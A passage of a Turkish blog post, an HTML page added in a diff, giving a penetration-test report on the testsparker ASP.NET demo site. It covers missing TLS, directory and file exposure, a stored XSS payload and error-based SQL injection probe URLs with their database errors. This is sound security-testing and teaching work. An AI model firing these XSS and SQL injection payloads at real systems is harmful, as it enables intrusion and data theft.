@@ -1,0 +1,404 @@
+<!doctype html>
+<html lang="en" dir="ltr" class="blog-wrapper blog-post-page plugin-blog plugin-id-default" data-has-hydrated="false">
+<head>
+<meta charset="UTF-8">
+<meta name="generator" content="Docusaurus v3.6.3">
+<title data-rh="true">Testsparker ASP.NET Sızma Testi &amp; Zaafiyet Analizi Raporu | b_log</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://berkercelik.github.io/b-log/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://berkercelik.github.io/b-log/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://berkercelik.github.io/b-log/blog/testsparker-sizma-testi-aspnet"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docusaurus_tag" content="default"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docsearch:docusaurus_tag" content="default"><meta data-rh="true" property="og:title" content="Testsparker ASP.NET Sızma Testi &amp; Zaafiyet Analizi Raporu | b_log"><meta data-rh="true" name="description" content="Özet"><meta data-rh="true" property="og:description" content="Özet"><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2025-05-10T00:00:00.000Z"><meta data-rh="true" property="article:author" content="https://github.com/berkercelik"><meta data-rh="true" property="article:tag" content="Siber Güvenlik"><link data-rh="true" rel="icon" href="/b-log/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://berkercelik.github.io/b-log/blog/testsparker-sizma-testi-aspnet"><link data-rh="true" rel="alternate" href="https://berkercelik.github.io/b-log/blog/testsparker-sizma-testi-aspnet" hreflang="en"><link data-rh="true" rel="alternate" href="https://berkercelik.github.io/b-log/blog/testsparker-sizma-testi-aspnet" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","@id":"https://berkercelik.github.io/b-log/blog/testsparker-sizma-testi-aspnet","mainEntityOfPage":"https://berkercelik.github.io/b-log/blog/testsparker-sizma-testi-aspnet","url":"https://berkercelik.github.io/b-log/blog/testsparker-sizma-testi-aspnet","headline":"Testsparker ASP.NET Sızma Testi & Zaafiyet Analizi Raporu","name":"Testsparker ASP.NET Sızma Testi & Zaafiyet Analizi Raporu","description":"Özet","datePublished":"2025-05-10T00:00:00.000Z","author":{"@type":"Person","name":"Berk Ali Erçelik","description":"Cyber Security & Full Stack Web Dev","url":"https://github.com/berkercelik","image":"https://avatars.githubusercontent.com/u/72663666?v=4"},"keywords":[],"isPartOf":{"@type":"Blog","@id":"https://berkercelik.github.io/b-log/blog","name":"Blog"}}</script><link rel="alternate" type="application/rss+xml" href="/b-log/blog/rss.xml" title="b_log RSS Feed">
+<link rel="alternate" type="application/atom+xml" href="/b-log/blog/atom.xml" title="b_log Atom Feed"><link rel="stylesheet" href="/b-log/assets/css/styles.bfd29945.css">
+<script src="/b-log/assets/js/runtime~main.78b32f56.js" defer="defer"></script>
+<script src="/b-log/assets/js/main.77e75098.js" defer="defer"></script>
+</head>
+<body class="navigation-with-keyboard">
+<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"dark")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/b-log/"><div class="navbar__logo"><img src="/b-log/img/logo.svg" alt="b_log" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/b-log/img/logo.svg" alt="b_log" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">b_log</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/b-log/blog">Blog</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/berkercelik" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_pO2u margin-bottom--md">Recent posts</div><div role="group"><h3 class="yearGroupHeading_rMGB">2025</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a aria-current="page" class="sidebarItemLink_mo7H sidebarItemLinkActive_I1ZP" href="/b-log/blog/testsparker-sizma-testi-aspnet">Testsparker ASP.NET Sızma Testi &amp; Zaafiyet Analizi Raporu</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/b-log/blog/wazuh-ile-siem-ortami">Wazuh ile SIEM Ortamı Hazırlama</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/b-log/blog/edr-nedir-ve-edr-nasil-calisir">EDR (Endpoint Detection and Response) Nedir? ve EDR Nasıl Çalışır?</a></li></ul></div></nav></aside><main class="col col--7"><article><header><h1 class="title_f1Hy">Testsparker ASP.NET Sızma Testi &amp; Zaafiyet Analizi Raporu</h1><div class="container_mt6G margin-vert--md"><time datetime="2025-05-10T00:00:00.000Z">May 10, 2025</time> · <!-- -->12 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--12 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a class="avatar__photo-link" href="/b-log/blog/authors/berkercelik"><img class="avatar__photo authorImage_XqGP" src="https://avatars.githubusercontent.com/u/72663666?v=4" alt="Berk Ali Erçelik"></a><div class="avatar__intro authorDetails_lV9A"><div class="avatar__name"><a href="/b-log/blog/authors/berkercelik"><span class="authorName_yefp">Berk Ali Erçelik</span></a></div><small class="authorTitle_nd0D" title="Cyber Security &amp; Full Stack Web Dev">Cyber Security &amp; Full Stack Web Dev</small><div class="authorSocials_rSDt"><a href="https://github.com/berkercelik" target="_blank" rel="noopener noreferrer" class="authorSocialLink_owbf" title="GitHub"><svg viewBox="0 0 256 250" width="1em" height="1em" class="authorSocialLink_owbf githubSvg_Uu4N" xmlns="http://www.w3.org/2000/svg" style="--dark:#000;--light:#fff" preserveAspectRatio="xMidYMid"><path d="M128.001 0C57.317 0 0 57.307 0 128.001c0 56.554 36.676 104.535 87.535 121.46 6.397 1.185 8.746-2.777 8.746-6.158 0-3.052-.12-13.135-.174-23.83-35.61 7.742-43.124-15.103-43.124-15.103-5.823-14.795-14.213-18.73-14.213-18.73-11.613-7.944.876-7.78.876-7.78 12.853.902 19.621 13.19 19.621 13.19 11.417 19.568 29.945 13.911 37.249 10.64 1.149-8.272 4.466-13.92 8.127-17.116-28.431-3.236-58.318-14.212-58.318-63.258 0-13.975 5-25.394 13.188-34.358-1.329-3.224-5.71-16.242 1.24-33.874 0 0 10.749-3.44 35.21 13.121 10.21-2.836 21.16-4.258 32.038-4.307 10.878.049 21.837 1.47 32.066 4.307 24.431-16.56 35.165-13.12 35.165-13.12 6.967 17.63 2.584 30.65 1.255 33.873 8.207 8.964 13.173 20.383 13.173 34.358 0 49.163-29.944 59.988-58.447 63.157 4.591 3.972 8.682 11.762 8.682 23.704 0 17.126-.148 30.91-.148 35.126 0 3.407 2.304 7.398 8.792 6.14C219.37 232.5 256 184.537 256 128.002 256 57.307 198.691 0 128.001 0Zm-80.06 182.34c-.282.636-1.283.827-2.194.39-.929-.417-1.45-1.284-1.15-1.922.276-.655 1.279-.838 2.205-.399.93.418 1.46 1.293 1.139 1.931Zm6.296 5.618c-.61.566-1.804.303-2.614-.591-.837-.892-.994-2.086-.375-2.66.63-.566 1.787-.301 2.626.591.838.903 1 2.088.363 2.66Zm4.32 7.188c-.785.545-2.067.034-2.86-1.104-.784-1.138-.784-2.503.017-3.05.795-.547 2.058-.055 2.861 1.075.782 1.157.782 2.522-.019 3.08Zm7.304 8.325c-.701.774-2.196.566-3.29-.49-1.119-1.032-1.43-2.496-.726-3.27.71-.776 2.213-.558 3.315.49 1.11 1.03 1.45 2.505.701 3.27Zm9.442 2.81c-.31 1.003-1.75 1.459-3.199 1.033-1.448-.439-2.395-1.613-2.103-2.626.301-1.01 1.747-1.484 3.207-1.028 1.446.436 2.396 1.602 2.095 2.622Zm10.744 1.193c.036 1.055-1.193 1.93-2.715 1.95-1.53.034-2.769-.82-2.786-1.86 0-1.065 1.202-1.932 2.733-1.958 1.522-.03 2.768.818 2.768 1.868Zm10.555-.405c.182 1.03-.875 2.088-2.387 2.37-1.485.271-2.861-.365-3.05-1.386-.184-1.056.893-2.114 2.376-2.387 1.514-.263 2.868.356 3.061 1.403Z"></path></svg></a><a href="https://www.linkedin.com/in/berkaliercelik/" target="_blank" rel="noopener noreferrer" class="authorSocialLink_owbf" title="LinkedIn"><svg width="1em" height="1em" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" viewBox="0 0 256 256" class="authorSocialLink_owbf"><path d="M218.123 218.127h-37.931v-59.403c0-14.165-.253-32.4-19.728-32.4-19.756 0-22.779 15.434-22.779 31.369v60.43h-37.93V95.967h36.413v16.694h.51a39.907 39.907 0 0 1 35.928-19.733c38.445 0 45.533 25.288 45.533 58.186l-.016 67.013ZM56.955 79.27c-12.157.002-22.014-9.852-22.016-22.009-.002-12.157 9.851-22.014 22.008-22.016 12.157-.003 22.014 9.851 22.016 22.008A22.013 22.013 0 0 1 56.955 79.27m18.966 138.858H37.95V95.967h37.97v122.16ZM237.033.018H18.89C8.58-.098.125 8.161-.001 18.471v219.053c.122 10.315 8.576 18.582 18.89 18.474h218.144c10.336.128 18.823-8.139 18.966-18.474V18.454c-.147-10.33-8.635-18.588-18.966-18.453" fill="#0A66C2"></path></svg></a></div></div></div></div></div></header><div id="__blog-post-container" class="markdown"><h2 class="anchor anchorWithStickyNavbar_LWe7" id="özet">Özet<a href="#özet" class="hash-link" aria-label="Direct link to Özet" title="Direct link to Özet">​</a></h2>
+<p>Bu sızma testi, <a href="http://aspnet.testsparker.com/" target="_blank" rel="noopener noreferrer">http://aspnet.testsparker.com/</a> adresinde barındırılan web uygulamasının güvenlik durumunu değerlendirmek amacıyla gerçekleştirilmiştir. Test sonucunda, Stored Cross-Site Scripting (XSS), Error-Based SQL Injection, hassas bilgi ifşası ve veri tabanı dosyası ifşası gibi kritik güvenlik açıkları tespit edilmiştir. Bu rapor, bulguların detaylı analizini, olası etkilerini ve bu riskleri azaltmak için alınabilecek önlemleri sunmayı amaçlamaktadır. </p>
+<p>Test, OWASP rehberleri ve manuel test teknikleri dahil olmak üzere manuel araçlar ve metodolojiler kullanılarak gerçekleştirilmiştir. Rapor, teknik ve yönetimsel kitlelere hitap edecek şekilde yapılandırılmış olup, güvenlik açıkları ciddiyet derecelerine göre önceliklendirilmiştir.</p>
+<p><strong>🛡️Bu sızma testi sırasında zaman ve kapsam sınırlamaları nedeniyle derinlemesine analiz yapamasam da, sistemdeki potansiyel giriş noktalarını başarıyla tespit ettim ve olası saldırı yüzeylerine dair genel bir farkındalık kazandım.</strong></p>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="1-giriş-ve-amaçlar">1. Giriş ve Amaçlar<a href="#1-giriş-ve-amaçlar" class="hash-link" aria-label="Direct link to 1. Giriş ve Amaçlar" title="Direct link to 1. Giriş ve Amaçlar">​</a></h2>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="11-amaç">1.1 Amaç<a href="#11-amaç" class="hash-link" aria-label="Direct link to 1.1 Amaç" title="Direct link to 1.1 Amaç">​</a></h3>
+<p>Bu sızma testinin amacı, <code>http://aspnet.testsparker.com/</code> adresinde barındırılan web uygulamasında güvenlik açıklarını tespit etmek ve sistemin gizlilik, bütünlük ve erişilebilirlik açısından olası risklerini değerlendirmektir. Test, genel güvenlik durumunu iyileştirmek için yapılmıştır.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="12-kapsam">1.2 Kapsam<a href="#12-kapsam" class="hash-link" aria-label="Direct link to 1.2 Kapsam" title="Direct link to 1.2 Kapsam">​</a></h3>
+<ul>
+<li><strong>Hedef Sistem</strong>: <code>http://aspnet.testsparker.com/</code> adresindeki web uygulaması (IP: 54.204.37.212)</li>
+<li><strong>Test Türleri</strong>: Harici ağ taraması, web uygulaması testi ve güvenlik açığı değerlendirmesi</li>
+<li><strong>Hariç Tutulanlar</strong>: Dahili ağ testi veya fiziksel güvenlik değerlendirmeleri yapılmamıştır</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="13-metodoloji">1.3 Metodoloji<a href="#13-metodoloji" class="hash-link" aria-label="Direct link to 1.3 Metodoloji" title="Direct link to 1.3 Metodoloji">​</a></h3>
+<p>Test süreci, OWASP Test Rehberine uygun olarak yürütülmüş, otomatik araçlar ve manuel teknikler kullanılmıştır:</p>
+<ul>
+<li><strong>Keşif</strong>: WHOIS sorgusu, DNS numaralandırması ve servis keşfi</li>
+<li><strong>Tarama</strong>: Nmap ile ağ taraması, Gobuster ve Ffuf ile dizin numaralandırması</li>
+<li><strong>Güvenlik Açığı Değerlendirmesi</strong>: Web uygulaması güvenlik açıkları için manuel testler (Burpsuite, Python)</li>
+<li><strong>İstismar</strong>: Tespit edilen güvenlik açıklarının doğrulanması</li>
+</ul>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="2-test-kapsamı-ve-yöntemleri">2. Test Kapsamı ve Yöntemleri<a href="#2-test-kapsamı-ve-yöntemleri" class="hash-link" aria-label="Direct link to 2. Test Kapsamı ve Yöntemleri" title="Direct link to 2. Test Kapsamı ve Yöntemleri">​</a></h2>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="21-test-edilen-sistemler">2.1 Test Edilen Sistemler<a href="#21-test-edilen-sistemler" class="hash-link" aria-label="Direct link to 2.1 Test Edilen Sistemler" title="Direct link to 2.1 Test Edilen Sistemler">​</a></h3>
+<ul>
+<li><strong>Alan Adı</strong>: <code>aspnet.testsparker.com</code></li>
+<li><strong>IP Adresi</strong>: 54.204.37.212</li>
+<li><strong>Web Uygulaması</strong>: Microsoft HTTPAPI httpd 2.0 üzerinde barındırılan ASP.NET tabanlı uygulama (IIS 8.5)</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="22-kullanılan-araçlar-ve-teknikler">2.2 Kullanılan Araçlar ve Teknikler<a href="#22-kullanılan-araçlar-ve-teknikler" class="hash-link" aria-label="Direct link to 2.2 Kullanılan Araçlar ve Teknikler" title="Direct link to 2.2 Kullanılan Araçlar ve Teknikler">​</a></h3>
+<ul>
+<li><strong>Nmap</strong>: Port tarama ve hizmet numaralandırması</li>
+<li><strong>Gobuster</strong>: Dizin ve dosya numaralandırması</li>
+<li><strong>Ffuf</strong>: Dizin ve dosya numaralandırması</li>
+<li><strong>Strings</strong>: Veritabanı dosyası içeriği analizi</li>
+<li><strong>Python HTTP Sunucusu</strong>: Cookie çalma denemeleri için veri toplama</li>
+<li><strong>Manuel Testler</strong>: XSS, SQL Injection, hassas dosya ifşası, Viewstate analizi ve hata mesajı analizi</li>
+<li><strong>Burp Suite</strong>: Manuel web uygulaması testi için kullanıldı.</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="23-test-türleri">2.3 Test Türleri<a href="#23-test-türleri" class="hash-link" aria-label="Direct link to 2.3 Test Türleri" title="Direct link to 2.3 Test Türleri">​</a></h3>
+<ul>
+<li>Açık portların ve hizmetlerin belirlenmesi için ağ taraması</li>
+<li>XSS, SQL Injection, yanlış yapılandırmalar ve hassas veri ifşası için web uygulaması testi</li>
+<li>Korunmasız kaynakları tespit etmek için dizin ve dosya numaralandırması</li>
+</ul>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="3-bulgular-ve-güvenlik-açıkları">3. Bulgular ve Güvenlik Açıkları<a href="#3-bulgular-ve-güvenlik-açıkları" class="hash-link" aria-label="Direct link to 3. Bulgular ve Güvenlik Açıkları" title="Direct link to 3. Bulgular ve Güvenlik Açıkları">​</a></h2>
+<p>Test sırasında tespit edilen güvenlik açıkları aşağıda listelenmiştir. Her bir bulgu, açıklama, etki ve kanıtlarla birlikte sunulmuştur.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="31-ssltls-eksikliği-kritik">3.1 SSL/TLS Eksikliği (Kritik)<a href="#31-ssltls-eksikliği-kritik" class="hash-link" aria-label="Direct link to 3.1 SSL/TLS Eksikliği (Kritik)" title="Direct link to 3.1 SSL/TLS Eksikliği (Kritik)">​</a></h3>
+<ul>
+<li><strong>Açıklama</strong>: Web uygulaması, SSL/TLS şifrelemesi olmadan HTTP üzerinden sunulmakta, istemci ve sunucu arasında iletilen tüm veriler interception riskine açıktır.</li>
+<li><strong>Etkilenen Bileşen</strong>: Tüm web uygulaması (<code>http://aspnet.testsparker.com/</code>)</li>
+<li><strong>Etki</strong>: Saldırganlar, oturum açma kimlik bilgileri veya kişisel bilgiler gibi hassas verileri ele geçirmek için man-in-the-middle (MITM) saldırıları gerçekleştirebilir.</li>
+<li><strong>Örnek CVSS Puanı</strong>: 7.5 (Yüksek) AV<!-- -->:N<!-- -->/AC<!-- -->:L<!-- -->/PR<!-- -->:N<!-- -->/UI<!-- -->:N<!-- -->/S<!-- -->:U<!-- -->/C<!-- -->:H<!-- -->/I<!-- -->:N<!-- -->/A<!-- -->:N</li>
+<li><strong>Kanıt</strong>: Uygulama, HTTPS yönlendirmesi olmadan <code>http://aspnet.testsparker.com/</code> üzerinden erişilebilir.</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="32-stored-cross-site-scripting-xss-in-guestbook-kritik">3.2 Stored Cross-Site Scripting (XSS) in Guestbook (Kritik)<a href="#32-stored-cross-site-scripting-xss-in-guestbook-kritik" class="hash-link" aria-label="Direct link to 3.2 Stored Cross-Site Scripting (XSS) in Guestbook (Kritik)" title="Direct link to 3.2 Stored Cross-Site Scripting (XSS) in Guestbook (Kritik)">​</a></h3>
+<ul>
+<li><strong>Açıklama</strong>: <code>/guestbook.aspx</code> sayfası, yetersiz giriş denetlemesi nedeniyle stored XSS zafiyetine sahiptir. <code>&lt;svg&gt;&lt;script&gt;confirm(1)&lt;/script&gt;&lt;/svg&gt;</code> payload’u, sayfa render edildiğinde JavaScript çalıştırır.</li>
+<li><strong>Etkilenen Bileşen</strong>: <code>http://aspnet.testsparker.com/guestbook.aspx</code></li>
+<li><strong>Etki</strong>: Saldırganlar, kullanıcı oturumlarını çalabilir, web sitesini tahrif edebilir veya kullanıcıları kötü amaçlı sitelere yönlendirebilir. Stored XSS, sayfayı ziyaret eden tüm kullanıcıları etkiler.</li>
+<li><strong>Örnek CVSS Puanı</strong>: 8.8 (Yüksek) CVSS:3.1/AV<!-- -->:N<!-- -->/AC<!-- -->:L<!-- -->/PR<!-- -->:L<!-- -->/UI<!-- -->:N<!-- -->/S<!-- -->:U<!-- -->/C<!-- -->:H<!-- -->/I<!-- -->:H<!-- -->/A<!-- -->:H</li>
+<li><strong>Kanıt</strong>: Guestbook’a <code>&lt;svg&gt;&lt;script&gt;confirm(1)&lt;/script&gt;&lt;/svg&gt;</code> payload’unun gönderilmesi, JavaScript uyarısını tetikler.</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="33-error-based-sql-injection-in-products-page-kritik">3.3 Error-Based SQL Injection in Products Page (Kritik)<a href="#33-error-based-sql-injection-in-products-page-kritik" class="hash-link" aria-label="Direct link to 3.3 Error-Based SQL Injection in Products Page (Kritik)" title="Direct link to 3.3 Error-Based SQL Injection in Products Page (Kritik)">​</a></h3>
+<ul>
+<li><strong>Açıklama</strong>: <code>http://aspnet.testsparker.com/Products.aspx?pId=2</code> adresinde, <code>pId</code> parametresi üzerinde yapılan SQL Injection denemeleri, hata tabanlı SQL Injection açığını ortaya çıkarmıştır. Hatalar, veritabanı yapısı ve veri türleri hakkında bilgi sızdırmaktadır.
+Ayrıca aynı sayfada bulunan yorum satırı olarak gizlenmiş buton POST olarak istek göndermektedir.</li>
+<li><strong>Etkilenen Bileşen</strong>: <code>http://aspnet.testsparker.com/Products.aspx</code></li>
+<li><strong>Etki</strong>: Saldırganlar, veritabanından hassas verileri (ör. kullanıcı bilgileri, ürün verileri) çıkarabilir, veritabanı yapısını manipüle edebilir veya yetkisiz erişim elde edebilir.</li>
+<li><strong>Örnek CVSS Puanı</strong>: 9.1 (Kritik) [CVSS:3.1/AV<!-- -->:N<!-- -->/AC<!-- -->:L<!-- -->/PR<!-- -->:N<!-- -->/UI<!-- -->:N<!-- -->/S<!-- -->:U<!-- -->/C<!-- -->:H<!-- -->/I<!-- -->:H<!-- -->/A<!-- -->:N<!-- -->]</li>
+<li><strong>Kanıt</strong>: Aşağıdaki denemeler ve hata mesajları:<!-- -->
+<ul>
+<li><code>http://aspnet.testsparker.com/Products.aspx?pId=asd</code>
+<ul>
+<li><strong>Hata</strong>: <code>Invalid column name &#x27;asd&#x27;.</code></li>
+</ul>
+</li>
+<li><code>http://aspnet.testsparker.com/Products.aspx?pId=user</code>
+<ul>
+<li><strong>Hata</strong>: <code>Conversion failed when converting the nvarchar value &#x27;dbo&#x27; to data type int.</code></li>
+</ul>
+</li>
+<li><code>http://aspnet.testsparker.com/Products.aspx?pId=2&#x27; OR 1=1--</code>
+<ul>
+<li><strong>Hata</strong>: <code>Incorrect syntax near &#x27;1&#x27;.</code></li>
+</ul>
+</li>
+<li><code>http://aspnet.testsparker.com/Products.aspx?pId=4&#x27;+convert(int,(SELECT @@version))--</code>
+<ul>
+<li><strong>Hata</strong>: <code>Incorrect syntax near the keyword &#x27;convert&#x27;. Incorrect syntax near &#x27;)&#x27;.</code></li>
+</ul>
+</li>
+<li>Ek olarak sayfanın kaynak kodunda bulunan yorum satırı:
+Aktif edildiğinde buton ile POST isteği gönderiliyor.</li>
+</ul>
+<img decoding="async" loading="lazy" alt="ISS85" src="/b-log/assets/images/3-5d61414a60b91ffe15acdc43dab5ac91.png" width="1326" height="240" class="img_ev3q"></li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="34-hassas-bilgi-i̇fşası---yapılandırma-dosyası-yüksek">3.4 Hassas Bilgi İfşası - Yapılandırma Dosyası (Yüksek)<a href="#34-hassas-bilgi-i̇fşası---yapılandırma-dosyası-yüksek" class="hash-link" aria-label="Direct link to 3.4 Hassas Bilgi İfşası - Yapılandırma Dosyası (Yüksek)" title="Direct link to 3.4 Hassas Bilgi İfşası - Yapılandırma Dosyası (Yüksek)">​</a></h3>
+<ul>
+<li>
+<p><strong>Açıklama</strong>: <code>http://aspnet.testsparker.com/statics/help-yes.html</code> dosyası, MAPI ayarları (<code>MAPI=1</code>, <code>CMCDLLNAME32=mapi32.dll</code>, vb.) gibi e-posta yapılandırma ayrıntılarını ifşa etmektedir.</p>
+</li>
+<li>
+<p><strong>Etkilenen Bileşen</strong>: <code>http://aspnet.testsparker.com/statics/help-yes.html</code></p>
+</li>
+<li>
+<p><strong>Etki</strong>: Saldırganlar, bu bilgileri e-posta ile ilgili hizmetleri hedeflemek veya yanlış yapılandırılmış e-posta istemcilerini istismar etmek için kullanabilir.</p>
+</li>
+<li>
+<p><strong>Kanıt</strong>: Dosya herkese açık olarak erişilebilir ve şu içeriği içerir:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">; for 16-bit app support [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1 CMCDLLNAME32=mapi32.dll CMC=1 MAPIX=1 MAPIXVER=1.0.0.1 OLEMessaging=1 [ResponseResult] ResultCode=0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="35-korunmasız-dizin-statics-orta">3.5 Korunmasız Dizin (<code>/statics/</code>) (Orta)<a href="#35-korunmasız-dizin-statics-orta" class="hash-link" aria-label="Direct link to 35-korunmasız-dizin-statics-orta" title="Direct link to 35-korunmasız-dizin-statics-orta">​</a></h3>
+<ul>
+<li><strong>Açıklama</strong>: <code>/statics/</code> dizini herkese açık olarak erişilebilir ve <code>help-yes.html</code> ile <code>data.mdb</code> gibi hassas dosyalar içerir.</li>
+<li><strong>Etkilenen Bileşen</strong>: <code>http://aspnet.testsparker.com/statics/</code></li>
+<li><strong>Etki</strong>: Saldırganlar, kısıtlanması gereken hassas yapılandırma dosyalarına veya diğer kaynaklara erişebilir.</li>
+<li><strong>Kanıt</strong>: Dizin erişilebilir ve <code>help-yes.html</code> ile <code>data.mdb</code> dosyaları hassas veriler içerir.</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="36-hassas-bilgi-i̇fşası---veritabanı-dosyası-yüksek">3.6 Hassas Bilgi İfşası - Veritabanı Dosyası (Yüksek)<a href="#36-hassas-bilgi-i̇fşası---veritabanı-dosyası-yüksek" class="hash-link" aria-label="Direct link to 3.6 Hassas Bilgi İfşası - Veritabanı Dosyası (Yüksek)" title="Direct link to 3.6 Hassas Bilgi İfşası - Veritabanı Dosyası (Yüksek)">​</a></h3>
+<ul>
+<li>
+<p><strong>Açıklama</strong>: <code>/statics/</code> dizininde bulunan <code>data.mdb</code> dosyası indirilebilir durumdadır ve <code>strings</code> komutuyla analiz edildiğinde hassas bilgiler (<code>mustafa</code> gibi potansiyel kullanıcı adı veya parola) içerir.</p>
+</li>
+<li>
+<p><strong>Etkilenen Bileşen</strong>: <code>http://aspnet.testsparker.com/statics/data.mdb</code></p>
+</li>
+<li>
+<p><strong>Etki</strong>: Saldırganlar, bu bilgileri kimlik doğrulama sistemlerini hedeflemek veya yetkisiz erişim elde etmek için kullanabilir.</p>
+</li>
+<li>
+<p><strong>Kanıt</strong>: <code>strings data.mdb</code> komutuyla elde edilen çıktı:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Standard Jet DB</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gr@?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">y[S)|*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mustafa</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="37-iis-85-hata-mesajı-ile-dizin-i̇fşası-yüksek">3.7 IIS 8.5 Hata Mesajı ile Dizin İfşası (Yüksek)<a href="#37-iis-85-hata-mesajı-ile-dizin-i̇fşası-yüksek" class="hash-link" aria-label="Direct link to 3.7 IIS 8.5 Hata Mesajı ile Dizin İfşası (Yüksek)" title="Direct link to 3.7 IIS 8.5 Hata Mesajı ile Dizin İfşası (Yüksek)">​</a></h3>
+<ul>
